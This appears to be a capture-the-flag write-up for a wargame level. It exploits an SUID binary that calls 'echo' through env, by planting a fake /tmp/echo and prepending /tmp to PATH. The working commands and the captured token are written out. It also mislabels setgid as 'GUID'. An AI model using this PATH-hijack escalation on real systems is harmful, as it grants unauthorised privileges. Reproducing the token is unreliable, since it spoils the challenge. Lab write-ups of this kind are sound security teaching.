#LEVEL 03
In our home directory, we have an executable with SUID (**S**et owner **U**ser **ID** up on execution) and GUID (**G**lobally **U**nique **Id**entifier) (the first s is for SETUID, and the second s is for SETGID, this means that when we execute `level03`, we execute it with the `uid` of `flag03` and the `gid` of `level03`):
```
>$ ls -la
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
>$ ./level03
Exploit me

>$ cat level03
[..]
...O����[�/usr/bin/env echo Exploit me;0p�...
[..]
```
It looks like ./level03 is calling ``echo`` from ``usr/bin/env``, calling binary that's defined by the environment.
lets play around by substitute our own `echo` binary, which calls `getflag` with `flag03` user permissions.
let's see where the getflag is. 
```
>$ which getflag
/bin/getflag
>$ /bin/getflag
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
```
Checking available folders where we can write and execute scripts with:
```
>$ ls -l /
[..]
d-wx-wx-wx  4 root root  100 Apr 10 08:09 tmp
[..]
```
we can write and execute programs in the `/tmp` folder
let's see permissions of echo program:
```
>$ ls -l /tmp/echo
-rw-rw-r-- 1 level03 level03 13 Jun  7 15:49 /tmp/echo
```
these are the minimum permissions for `/tmp/echo` because we are executing `~/level03` with the `gid` of `level03` so it needs to be able to `r`(read) and `x`(execute), 
then `getflag` is executed with the `uid` of `flag03` (li ma3ndnach).
Then, we instruct bash to look for the executable in `/tmp` first by adding *`/tmp`* at the beginning of the **$PATH** environment variable.
after that we execute the executable `./level03` :

```
>$ echo '/bin/getflag' > /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp:$PATH; ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

##### OR
we can create a symbolic link of `getflag` in `/tmp` as `/tmp/echo`:
```
>$ ln -s /bin/getflag /tmp/echo
>$ env PATH="/tmp:$PATH" ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
#### Vulnerability:
Env invocation by a privileged user -> Privilege escalation by providing replacement to built-in command

#### Documentations:
1. https://www.commentcamarche.net/faq/3585-bash-la-variable-d-environnement-path
1. https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
1. https://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code
1. https://unix.stackexchange.com/questions/29608/why-is-it-better-to-use-usr-bin-env-name-instead-of-path-to-name-as-my
1. https://stackoverflow.com/questions/1641477/how-to-set-environment-variable-for-everyone-under-my-linux-system
1. https://www.tecmint.com/how-to-find-files-with-suid-and-sgid-permissions-in-linux/
1. https://linux.goffinet.org/administration/securite-locale/permissions-linux/
1. https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits
1. https://stackoverflow.com/questions/30130954/alias-doesnt-work-inside-a-bash-script